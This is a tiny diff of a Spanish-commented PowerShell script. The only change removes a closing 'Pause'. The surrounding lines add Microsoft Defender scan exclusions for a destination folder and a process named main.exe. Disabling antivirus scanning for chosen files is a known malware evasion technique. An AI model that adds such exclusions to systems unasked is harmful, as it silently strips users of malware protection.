@@ -16,5 +16,3 @@ Add-MpPreference -ExclusionPath $carpetaDestino
 
 # Agregar exclusión para el ejecutable main.exe
 Add-MpPreference -ExclusionProcess $ejecutable
-
-Pause
